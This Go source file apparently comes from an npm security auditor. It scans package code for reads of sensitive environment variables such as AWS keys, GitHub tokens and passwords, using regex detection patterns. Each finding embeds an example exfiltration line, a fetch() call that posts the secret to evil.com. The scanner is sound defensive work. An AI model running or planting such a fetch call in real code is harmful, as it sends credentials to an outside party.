package analyzer

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

type envPattern struct {
	pattern  *regexp.Regexp
	severity Severity
}

var (
	// Patterns for sensitive environment variables, ordered by severity/priority
	envPatterns = []envPattern{
		{regexp.MustCompile(`(?i)AWS_(SECRET|ACCESS|TOKEN)`), SeverityCritical},
		{regexp.MustCompile(`(?i)STRIPE_(SECRET|KEY)`), SeverityCritical},
		{regexp.MustCompile(`(?i)GITHUB_(TOKEN|AUTH|SECRET)`), SeverityCritical},
		{regexp.MustCompile(`(?i)(PASSWORD|PASSPHRASE|SECRET|TOKEN)`), SeverityHigh},
		{regexp.MustCompile(`(?i)(PRIVATE|SSH)_KEY`), SeverityHigh},
	}

	// Safe variables to ignore
	envIgnore = []string{"NODE_ENV", "VERSION", "NAME", "LANG", "PORT", "HOST"}
)

type EnvAnalyzer struct{}

func NewEnvAnalyzer() *EnvAnalyzer {
	return &EnvAnalyzer{}
}

func (a *EnvAnalyzer) Name() string {
	return "environment-variables"
}

func (a *EnvAnalyzer) Analyze(ctx context.Context, pkg *registry.PackageMetadata, version *registry.PackageVersion) ([]Finding, error) {
	// This analyzer is typically called via TarballAnalyzer during file scanning
	return nil, nil
}

func (a *EnvAnalyzer) scanContent(content, filename string) []Finding {
	var findings []Finding

	// Look for process.env.VAR or process.env['VAR']
	re := regexp.MustCompile(`process\.env(?:\.([a-zA-Z0-9_]+)|\[['"]([a-zA-Z0-9_]+)['"]\])`)
	matches := re.FindAllStringSubmatch(content, -1)

	for _, match := range matches {
		varName := match[1]
		if varName == "" {
			varName = match[2]
		}

		if varName == "" || a.isIgnored(varName) {
			continue
		}

		for _, p := range envPatterns {
			if p.pattern.MatchString(varName) {
				findings = append(findings, Finding{
					Analyzer:    a.Name(),
					Title:       "Sensitive environment variable access",
					Description: "The package accesses a potentially sensitive environment variable: " + varName + " in " + filename,
					Severity:    p.severity,
					ExploitExample: fmt.Sprintf("fetch('https://evil.com/leak', { body: process.env.%s });", varName),
					Remediation:    "Use a dedicated secrets manager or a well-vetted configuration library. Never leak process.env to logs or network requests.",
				})
				break
			}
		}
	}

	return findings
}

func (a *EnvAnalyzer) isIgnored(name string) bool {
	upper := strings.ToUpper(name)
	for _, ignore := range envIgnore {
		if upper == ignore {
			return true
		}
	}
	return false
}
